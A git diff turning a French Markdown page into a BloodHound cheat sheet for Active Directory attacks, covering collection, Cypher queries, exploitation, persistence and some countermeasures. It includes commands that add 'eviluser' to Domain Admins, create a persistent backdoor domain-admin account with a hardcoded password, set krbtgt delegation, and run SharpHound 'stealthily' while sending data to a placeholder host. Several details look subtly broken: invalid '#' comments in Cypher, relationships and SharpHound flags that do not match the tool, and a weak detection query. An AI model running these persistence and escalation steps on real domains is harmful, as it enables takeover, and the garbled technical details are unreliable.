@@ -4,63 +4,248 @@ date: "2025-07-15"
 draft: false
 ---
 
-# 🐶 BloodHound
+# 🩸 BloodHound - Cheat Sheet
 
-## Qu'est-ce que BloodHound ?
+## 🎯 Vue d'ensemble
+BloodHound est un outil d'analyse de sécurité Active Directory qui utilise des graphiques pour identifier et exploiter les relations complexes entre les objets AD pour l'escalade de privilèges.
 
-**BloodHound** est un outil d'analyse de graphe permettant de cartographier et d'analyser les relations et permissions dans un environnement Active Directory. Il est très utilisé en audit de sécurité et en red teaming.
+---
 
-## 🎯 Objectifs pédagogiques
+## 🔍 Installation et Configuration
 
-- Comprendre l'intérêt de la cartographie des relations AD
-- Savoir utiliser BloodHound pour identifier des chemins d'attaque
-
-## 📋 Exemples de scénarios et commandes
-
-### Collecte de données avec SharpHound
-
-- **Collecte complète** :
-
+### Installation de BloodHound
 ```bash
-SharpHound.exe -c All -d ad.local -u user -p 'Password123!'
+# Installation via apt (Kali Linux)
+# Pourquoi : Installer BloodHound sur des systèmes Debian/Ubuntu
+sudo apt update
+sudo apt install bloodhound
+
+# Installation via git
+# Pourquoi : Obtenir la dernière version depuis GitHub
+git clone https://github.com/BloodHoundAD/BloodHound.git
+cd BloodHound
+sudo apt install neo4j
 ```
 
-- **Collecte ciblée (groupes à privilèges)** :
-
+### Configuration de Neo4j
 ```bash
-SharpHound.exe -c ACL,Session,Trusts -d ad.local
+# Démarrer Neo4j
+# Pourquoi : Base de données graphique nécessaire pour BloodHound
+sudo neo4j start
+sudo neo4j status
+
+# Configuration de la base de données
+# Pourquoi : Configurer les paramètres de connexion
+# URL: bolt://localhost:7687
+# Username: neo4j
+# Password: bloodhound
 ```
 
-- **Collecte via Linux (impacket)** :
-
+### Installation des Collecteurs
 ```bash
-python3 bloodhound-python -u user -p 'Password123!' -d ad.local -c all -ns 10.10.10.2
+# SharpHound (Windows)
+# Pourquoi : Collecteur principal pour Windows
+# Télécharger depuis: https://github.com/BloodHoundAD/BloodHound/releases
+# SharpHound.exe ou SharpHound.ps1
+
+# AzureHound (Azure AD)
+# Pourquoi : Collecteur pour les environnements Azure AD
+# Télécharger depuis: https://github.com/BloodHoundAD/AzureHound/releases
 ```
 
-### Analyse et exploitation
+---
 
-- **Recherche de chemins d'escalade** :
-  - Utiliser l'interface graphique BloodHound pour visualiser les chemins d'attaque (ex : "Shortest Path to Domain Admins").
-- **Exploitation d'une délégation non contrainte** :
-  - Identifier les comptes avec la délégation et tenter un Kerberos S4U2Self/S4U2Proxy.
+## 🛠️ Collecte de Données
 
-### Cas d'usage
+### Collecte avec SharpHound
+```powershell
+# Collecte complète
+# Pourquoi : Collecter toutes les données AD disponibles
+.\SharpHound.exe -c All
 
-- Audit de la surface d'attaque AD
-- Détection de comptes à privilèges mal configurés
-- Préparation d'une campagne de red teaming
+# Collecte spécifique
+# Pourquoi : Collecter seulement certains types de données
+.\SharpHound.exe -c Group,Computer,User
 
-## 🛡️ Bonnes pratiques
+# Collecte avec exfiltration
+# Pourquoi : Envoyer les données directement à BloodHound
+.\SharpHound.exe -c All -URI http://BLOODHOUND_IP:7474
 
-- Limiter les droits d'administration déléguée
-- Auditer régulièrement les groupes à privilèges
-- Surveiller l'utilisation d'outils de collecte comme SharpHound
+# Collecte silencieuse
+# Pourquoi : Éviter la détection pendant la collecte
+.\SharpHound.exe -c All -Stealth
+```
 
-## 📚 Ressources utiles
+### Collecte avec PowerShell
+```powershell
+# Import et exécution
+# Pourquoi : Utiliser PowerShell pour exécuter SharpHound
+Import-Module .\SharpHound.ps1
+Invoke-BloodHound -CollectionMethod All
 
-- [BloodHound Wiki](https://bloodhound.readthedocs.io/)
-- [HackTricks - BloodHound](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/bloodhound)
-- [SpecterOps - BloodHound](https://specterops.io/asset/bloodhound)
+# Collecte avec options avancées
+# Pourquoi : Personnaliser la collecte selon les besoins
+Invoke-BloodHound -CollectionMethod All -ExcludeDomainControllers -ExcludeLocalAdmin
+```
+
+### Collecte Azure AD
+```powershell
+# Collecte Azure AD
+# Pourquoi : Collecter les données d'Azure Active Directory
+.\AzureHound.exe -u username@domain.com -p password
+
+# Collecte avec token
+# Pourquoi : Utiliser un token d'authentification pour Azure
+.\AzureHound.exe -t "access_token_here"
+```
+
+---
+
+## 🔧 Analyse avec BloodHound
+
+### Requêtes Cypher de Base
+```cypher
+// Trouver tous les utilisateurs avec des privilèges d'admin de domaine
+# Pourquoi : Identifier les comptes avec des privilèges élevés
+MATCH (u:User {admincount:true}) RETURN u
+
+// Trouver les chemins d'escalade de privilèges
+# Pourquoi : Identifier les chemins pour obtenir des privilèges élevés
+MATCH p=shortestPath((u:User)-[*1..]->(d:Domain {name:"DOMAIN.LOCAL"})) RETURN p
+
+// Trouver les utilisateurs avec des droits de délégation
+# Pourquoi : Identifier les comptes avec des délégations Kerberos
+MATCH (u:User)-[:AllowedToDelegate]->(c:Computer) RETURN u,c
+```
+
+### Requêtes Avancées
+```cypher
+// Trouver les chemins vers les groupes d'administrateurs
+# Pourquoi : Identifier les chemins d'escalade vers les groupes admin
+MATCH p=(u:User)-[*1..]->(g:Group {name:"DOMAIN ADMINS"}) RETURN p
+
+// Trouver les comptes avec des mots de passe jamais expirés
+# Pourquoi : Identifier les comptes avec des mots de passe persistants
+MATCH (u:User {pwdneverexpires:true}) RETURN u
+
+// Trouver les relations de propriété
+# Pourquoi : Identifier qui possède quels objets
+MATCH (u:User)-[:Owns]->(o) RETURN u,o
+```
+
+### Requêtes de Détection
+```cypher
+// Trouver les comptes de service avec des SPNs
+# Pourquoi : Identifier les comptes de service pour Kerberoasting
+MATCH (u:User)-[:HasSPN]->(s:SPN) RETURN u,s
+
+// Trouver les comptes avec des droits de réplication
+# Pourquoi : Identifier les comptes pouvant effectuer DCSync
+MATCH (u:User)-[:ReplicateDirectoryChanges]->(d:Domain) RETURN u,d
+
+// Trouver les délégations non contraintes
+# Pourquoi : Identifier les délégations dangereuses
+MATCH (u:User)-[:AllowedToDelegate]->(c:Computer) WHERE c.primarygroup = "DOMAIN COMPUTERS" RETURN u,c
+```
+
+---
+
+## 🎯 Techniques d'Exploitation
+
+### Escalade de Privilèges
+```powershell
+# Utilisation des chemins trouvés
+# Pourquoi : Exploiter les chemins d'escalade identifiés par BloodHound
+# Exemple: Ajouter un utilisateur à un groupe avec des privilèges
+Add-ADGroupMember -Identity "DOMAIN ADMINS" -Members "eviluser"
+
+# Exploitation des délégations
+# Pourquoi : Exploiter les délégations Kerberos identifiées
+# Utiliser Rubeus ou Impacket pour l'exploitation
+```
+
+### Persistance
+```powershell
+# Création de comptes persistants
+# Pourquoi : Maintenir l'accès après l'escalade de privilèges
+New-ADUser -Name "EvilUser" -AccountPassword (ConvertTo-SecureString "EvilPass123!" -AsPlainText -Force) -Enabled $true
+Add-ADGroupMember -Identity "DOMAIN ADMINS" -Members "EvilUser"
+
+# Modification des ACLs
+# Pourquoi : Modifier les permissions pour maintenir l'accès
+Set-ADObject -Identity "CN=EvilUser,CN=Users,DC=domain,DC=local" -Add @{msDS-AllowedToDelegateTo="krbtgt/DOMAIN.LOCAL"}
+```
+
+---
+
+## 🔍 Post-Exploitation
+
+### Analyse des Données Collectées
+```bash
+# Import des données dans BloodHound
+# Pourquoi : Analyser les données collectées dans l'interface graphique
+# 1. Ouvrir BloodHound
+# 2. Importer les fichiers .zip collectés
+# 3. Analyser les graphiques générés
+
+# Export des résultats
+# Pourquoi : Exporter les résultats pour documentation
+# Utiliser l'interface BloodHound pour exporter les graphiques
+```
+
+### Génération de Rapports
+```powershell
+# Génération de rapports automatiques
+# Pourquoi : Créer des rapports détaillés des vulnérabilités trouvées
+# Utiliser les fonctionnalités de rapport de BloodHound
+
+# Export des chemins critiques
+# Pourquoi : Documenter les chemins d'escalade critiques
+# Utiliser l'interface pour exporter les chemins identifiés
+```
+
+---
+
+## 🛡️ Contre-Mesures
+
+### Détection
+```powershell
+# Surveillance des requêtes BloodHound
+# Pourquoi : Détecter l'utilisation de BloodHound dans l'environnement
+Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4624} | Where-Object {$_.Message -like "*BloodHound*"}
+
+# Surveillance des collecteurs
+# Pourquoi : Détecter l'exécution des collecteurs BloodHound
+Get-Process | Where-Object {$_.ProcessName -like "*SharpHound*"}
+```
+
+### Mitigation
+```powershell
+# Réduction des privilèges
+# Pourquoi : Réduire les privilèges excessifs identifiés
+Remove-ADGroupMember -Identity "DOMAIN ADMINS" -Members "user_with_excessive_privileges"
+
+# Correction des délégations
+# Pourquoi : Corriger les délégations dangereuses
+Set-ADObject -Identity "CN=User,CN=Users,DC=domain,DC=local" -Clear "msDS-AllowedToDelegateTo"
+```
+
+### Configuration Sécurisée
+```powershell
+# Configuration des politiques de sécurité
+# Pourquoi : Configurer des politiques pour limiter les escalades
+# GPO: Computer Configuration > Windows Settings > Security Settings > Local Policies > User Rights Assignment
+# "Access this computer from the network" = Administrators, Authenticated Users
+```
+
+---
+
+## 📚 Ressources
+
+- **BloodHound GitHub** : https://github.com/BloodHoundAD/BloodHound
+- **BloodHound Documentation** : https://bloodhound.readthedocs.io/
+- **BloodHound Cypher Queries** : https://github.com/BloodHoundAD/BloodHound/wiki/Cypher-Queries
+- **BloodHound Training** : https://bloodhound.readthedocs.io/en/latest/training/
 
 ---
 
